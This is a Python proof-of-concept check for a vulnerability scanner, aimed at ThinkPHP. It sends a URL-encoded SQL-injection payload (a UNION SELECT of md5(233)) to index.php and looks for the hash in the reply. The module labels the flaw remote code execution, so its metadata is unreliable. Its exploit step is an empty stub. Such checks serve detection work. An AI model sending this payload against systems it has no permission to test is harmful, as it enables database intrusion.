# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    poc_id = 'b65a4317-f7ed-41e2-8850-28aacfbab8e1'
    name = 'ThinkPHP 远程代码执行' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = 'Unkonwn'  # 漏洞公布时间
    desc = '''
        ThinkPHP index.php界面，由于服务器端没有针对执行函数做过滤，导致远程命令执行漏洞。 
    ''' # 漏洞描述
    ref = 'Unkonwn' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'ThinkPHP'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'b869a2a9-48c5-4b7c-8551-0f504449e41c'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/index.php?s=/home/pay/index/orderid/1%27)%20UNION%20ALL%20SELECT%20md5(233)--+'
            request = requests.get(self.target + payload)
            r = request.text
            if request.status_code == 200 and 'e165421110ba03099a1c0393373c5b43' in r:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
